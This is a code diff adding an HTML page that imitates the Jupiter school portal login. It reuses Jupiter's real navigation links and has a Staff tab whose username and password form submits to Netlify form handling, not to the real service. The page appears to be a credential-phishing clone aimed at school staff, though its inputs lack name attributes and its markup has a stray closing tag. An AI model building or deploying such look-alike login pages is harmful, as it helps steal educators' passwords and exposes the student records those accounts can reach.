@@ -1,1 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Jupiter Login</title>
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <header>
+    <div class="logo">🌐 JUPITER</div>
+    <nav>
+      <a href="https://login.jupitered.com/login/index.php">Español</a>
+      <a href="https://login.jupitered.com/signup/">Signup</a>
+      <a href="https://login.jupitered.com/edstore/">EdStore</a>
+      <a href="https://login.jupitered.com/help/">Help</a>
+      <a href="https://jupitered.com/privacy.html">Privacy</a>
+      <a href="https://jupitered.com/?home=1">About</a>
+    </nav>
+  </header>
 
+  <main>
+    <div class="login-box">
+      <div class="tabs">
+        <a href="student.html"><button class="tab">Student</button></a>
+        <button class="tab">Parent</button>
+        <button class="tab">Sub</button>
+        <button class="tab">TA</button>
+        <button class="tab active">Staff</button>
+      </div>
+
+</form>
+      <form method="POST" data-netlify="true">
+        <input type="text" placeholder="Username" />
+        <input type="password" placeholder="Password" />
+        <select>
+          <option>Stay logged in</option>
+          <option>Lock screen if idle 5 minutes</option>
+          <option>Lock screen if idle 10 minutes</option>
+          <option>Lock screen if idle 15 minutes</option>
+          <option>Lock screen if idle 20 minutes</option>
+          <option>Lock screen if idle 30 minutes</option>
+          <option>Lock screen if idle 45 minutes</option>
+          <option>Lock screen if idle 60 minutes</option>
+        </select>
+        <div class="buttons">
+          <button type="button" class="help-btn">Help Me Login</button>
+          <button type="submit" class="login-btn">Login</button>
+        </div>
+      </form>
+    </div>
+  </main>
+</body>
+</html>
